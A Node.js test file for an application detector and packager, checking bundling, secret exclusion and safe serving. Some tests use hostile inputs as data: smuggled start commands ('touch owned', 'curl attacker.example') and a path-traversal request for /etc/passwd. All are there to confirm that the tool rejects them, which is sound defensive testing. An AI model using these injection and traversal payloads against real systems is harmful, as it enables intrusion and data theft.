import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile, readFile, rm, symlink } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { createServer } from 'node:http';
import { randomBytes } from 'node:crypto';
import { detectApplication, entryFromStart } from '../src/detect.mjs';
import { prepare } from '../scripts/prepare.mjs';
import { decodeArtifact, run } from '../src/runner.mjs';

async function fixture(t, files) {
  const root = await mkdtemp(join(tmpdir(), 'pods-detect-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  for (const [name, value] of Object.entries(files)) {
    await mkdir(join(root, name, '..'), { recursive: true });
    await writeFile(join(root, name), typeof value === 'string' ? value : JSON.stringify(value));
  }
  return root;
}

test('detects and bundles a TypeScript server and its assets without pods.json', async t => {
  const root = await fixture(t, {
    'package.json': { name: '@demo/my-product', scripts: { start: 'tsx src/server.ts' } },
    'src/server.ts': 'import {createServer} from "node:http"; const title: string = "Real product"; createServer((q,s)=>s.end(title)).listen(Number(process.env.PORT));',
    'public/index.html': '<!doctype html><title>Product</title>',
    'public/.env': 'PRIVATE_SECRET=never-package',
  });
  const plan = await detectApplication(root);
  assert.equal(plan.id, 'my-product');
  assert.equal(plan.entry, 'src/server.ts');
  assert.equal(plan.detected, true);
  assert.deepEqual(plan.assets, ['public']);
  const output = join(root, '.output');
  const built = await prepare(root, output);
  assert.equal(built.detected, true);
  const bytes = await readFile(join(output, 'artifacts', `${built.sha256}.gz`));
  const artifact = decodeArtifact(bytes, built.sha256);
  assert.deepEqual(artifact.files.map(x => x.path), ['app.cjs', 'public/index.html']);
  assert.equal((await prepare(root, output)).sha256, built.sha256);
});

test('detects a generated Node entrypoint before build, but packaging requires its output', async t => {
  const root = await fixture(t, { 'package.json': { name: 'built-app', scripts: { build: 'tsc', start: 'node dist/server.js' } } });
  assert.equal((await detectApplication(root)).entry, 'dist/server.js');
  await assert.rejects(prepare(root, join(root, '.out')), /ENOENT/);
  await mkdir(join(root, 'dist'));
  await writeFile(join(root, 'dist/server.js'), 'console.log("built")');
  assert.equal((await prepare(root, join(root, '.out'))).applicationType, 'node');
});

test('detects Vite frontend output and rejects missing build output', async t => {
  const root = await fixture(t, {
    'package.json': { name: 'frontend', scripts: { build: 'vite build' }, devDependencies: { vite: '^7.0.0' } },
    'index.html': '<title>Unbuilt source</title>',
  });
  assert.equal((await detectApplication(root)).kind, 'static');
  await assert.rejects(prepare(root, join(root, '.out')), /did not produce/);
  await mkdir(join(root, 'dist'));
  await writeFile(join(root, 'dist/index.html'), '<!doctype html><title>Compiled product</title>');
  assert.equal((await prepare(root, join(root, '.out'))).applicationType, 'static');
});

test('plain static artifact serves its actual page, assets and client routes on compute', async t => {
  const root = await fixture(t, {
    'index.html': '<!doctype html><html><title>Counter product</title><button id="count">0</button><script src="/app.js"></script></html>',
    'app.js': 'document.querySelector("button").onclick = e => e.target.textContent++;',
    'style.css': 'body { color: green; }',
    '.env': 'SECRET=never-publish',
  });
  // Output is separate from the site, as it is in the isolated builder.
  const output = await fixture(t, {});
  const manifest = await prepare(root, output);
  assert.equal(manifest.applicationType, 'static');
  const bytes = await readFile(join(output, 'artifacts', manifest.sha256 + '.gz'));
  assert.ok(!decodeArtifact(bytes, manifest.sha256).files.some(f => f.path.includes('.env')));
  const server = createServer(async (req, res) => {
    if (req.url === '/artifact') return res.end(bytes);
    for await (const chunk of req) { /* Consume callback. */ }
    res.end('{}');
  });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${server.address().port}`;
  let app;
  try {
    app = await run({
      id: randomBytes(24).toString('base64url'), appId: manifest.id, sha256: manifest.sha256,
      artifactUrl: origin + '/artifact', callbackUrl: origin + '/callback', token: 'test',
      port: 18086, expiresAt: Date.now() + 60000,
    }, { root: join(output, 'compute') });
    const page = await fetch('http://127.0.0.1:18086/');
    assert.match(page.headers.get('content-type'), /text\/html/);
    assert.match(await page.text(), /Counter product/);
    const script = await fetch('http://127.0.0.1:18086/app.js');
    assert.match(script.headers.get('content-type'), /javascript/);
    assert.match(await script.text(), /onclick/);
    const route = await fetch('http://127.0.0.1:18086/projects/one', { headers: { Accept: 'text/html' } });
    assert.equal(route.status, 200);
    assert.match(await route.text(), /Counter product/);
    for (const path of ['/.env', '/%2eenv', '/missing.js', '/%2e%2e%2fetc/passwd']) {
      assert.equal((await fetch('http://127.0.0.1:18086' + path)).status, 404);
    }
  } finally {
    await app?.stop();
    await new Promise(resolve => server.close(resolve));
  }
});

test('detection reports ambiguity and never executes a shell start command', async t => {
  const root = await fixture(t, { 'server.js': '', 'app.js': '' });
  await assert.rejects(detectApplication(root), /More than one/);
  await writeFile(join(root, 'package.json'), JSON.stringify({ scripts: { start: 'node server.js; touch owned' } }));
  await assert.rejects(detectApplication(root), /could not be detected safely/);
  assert.equal(entryFromStart('NODE_ENV=production node --enable-source-maps server.js'), 'server.js');
  assert.equal(entryFromStart('node server.js && curl attacker.example'), null);
});

test('entrypoints and asset directories cannot escape through paths or symlinks', async t => {
  const outside = await fixture(t, { 'server.js': 'console.log("outside")', 'assets/x.txt': 'private' });
  const root = await fixture(t, {
    'pods.json': { id: 'unsafe-app', name: 'Unsafe', entry: '../server.js', healthPath: '/' },
  });
  await assert.rejects(prepare(root, join(root, '.out')), /escapes/);
  await symlink(join(outside, 'server.js'), join(root, 'server.js'));
  await writeFile(join(root, 'pods.json'), JSON.stringify({ id: 'unsafe-app', name: 'Unsafe', entry: 'server.js', healthPath: '/' }));
  await assert.rejects(prepare(root, join(root, '.out')), /Symlink/);
  await rm(join(root, 'server.js'));
  await writeFile(join(root, 'server.js'), 'console.log("safe")');
  await symlink(join(outside, 'assets'), join(root, 'assets'));
  await writeFile(join(root, 'pods.json'), JSON.stringify({ id: 'unsafe-app', name: 'Unsafe', entry: 'server.js', healthPath: '/', assets: ['assets/x.txt'] }));
  await assert.rejects(prepare(root, join(root, '.out')), /Symlink/);
});
